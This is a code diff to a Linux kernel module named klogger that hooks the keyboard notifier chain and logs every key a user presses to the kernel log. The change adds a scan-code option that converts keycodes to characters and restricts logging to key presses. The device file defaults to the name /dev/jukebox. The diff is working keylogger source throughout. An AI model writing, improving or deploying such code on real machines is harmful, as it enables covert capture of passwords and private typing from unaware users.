@@ -18,10 +18,11 @@ static char c;
 
 /* Module's input parameters */
 static char *cdev_name = "jukebox";
+static char *scan_code = "RAW";
 module_param(cdev_name, charp, 0000);
 MODULE_PARM_DESC(cdev_name, " Define a different name for your /dev file. By default, it is /dev/jukebox.");
-
-
+module_param(scan_code, charp, 0000);
+MODULE_PARM_DESC(scan_code, " Select the most suitable scan code to your keyboard layout. Only RAW and SET1 (IBM PC XT) are available");  
 
 /** 
  * Handler responsable to read and log every key pressed by the user
@@ -31,13 +32,23 @@ int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_
   struct keyboard_notifier_param *param = _param;
   struct vc_data *vc = param->vc;
 
-  if (code == KBD_KEYCODE) {
-    printk(KERN_DEBUG "KEYLOGGER keycode=%lu value=%i down=%s shift=%i ledstate=%i\n",
+  if (code == KBD_KEYCODE && param->down) { // log only when user press the button, ignoring the release button action
+
+#ifdef DEBUG
+    printk(KERN_DEBUG "KEYLOGGER code=%lu value=%i down=%s shift=%i ledstate=%i\n",
 		code,
 		param->value, 
 		(param->down ? "down" : "up"),
 		param->shift,
 		param->ledstate);
+#endif
+	
+	if(strcmp(scan_code,"SET1")==0) {
+		printk("%c",convertKeycode2Character(param->value,param->shift));
+	} 
+	else {
+                printk("%i",param->value);
+	}
   }
 
   return NOTIFY_OK;
@@ -120,7 +131,7 @@ static int __init klogger_init(void)
 {
   init_dev_file();
   register_keyboard_notifier(&nb);
-  printk(KERN_INFO "klogger registered and listening");
+  printk(KERN_INFO "klogger registered and listening\n");
 
   return 0;
 }
@@ -129,7 +140,7 @@ static void __exit klogger_exit(void)
 {
   clear_dev_file();
   unregister_keyboard_notifier(&nb);
-  printk(KERN_INFO "klogger unregistered");
+  printk(KERN_INFO "klogger unregistered\n");
 }
 
 
